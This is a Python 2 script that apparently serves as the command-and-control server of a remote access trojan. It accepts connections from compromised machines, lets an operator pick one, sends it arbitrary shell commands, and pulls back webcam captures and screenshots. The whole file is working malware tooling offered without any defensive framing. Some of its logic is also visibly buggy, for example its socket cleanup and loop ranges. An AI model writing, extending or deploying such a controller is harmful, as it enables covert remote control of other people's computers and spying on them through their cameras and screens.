import socket
import os
import sys

host = ''
port = 7757

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(250)

socks = []
clients = []

active = False

def refresh():
    os.system("cls")
    for i in range(len(clients)):
        print "[" + str(i+1) + "]" + " - Client " + str(clients[i]) + "\n"

    print "[0] Exit..."
        
        

while True:
    refresh()
    try:
        s.settimeout(3)
        try:
            conn, addr = s.accept()
        except socket.timeout:
            continue

        if (conn):
            s.settimeout(None)
            socks += [conn]
            clients += [str(addr)]

    except KeyboardInterrupt:
        refresh()
        activate = input("Choose a client or quit: ")

        if activate == 0:
            print "Exiting..."
            for k in (0, len(socks)):
                socks[k].close()
            sys.exit(0)


        activate -=1
        socks[activate].setblocking(1)
        active = True
        os.system("cls")

    while active:
        cmd = raw_input(">")
        if cmd == 'quit':
            active = False
            socks[activate].close()
            socks.remove(socks[activate])
            clients.remove(socks[activate])

        elif cmd == 'webcam':
            socks[activate].send(cmd)
            image = socks[activate].recv(1024 * 1024)
            f = open("remote.jpg", "wb")
            f.write(image)
            f.close()

        elif cmd == 'screenshot':
            socks[activate].send(cmd)
            screenshot = socks[activate].recv(1024 * 1024)
            g = open("screenshot.jpg", "wb")
            g.write(screenshot)
            g.close()

        else:
            socks[activate].send(cmd)
            data = socks[activate].recv(4096)
            print data





                
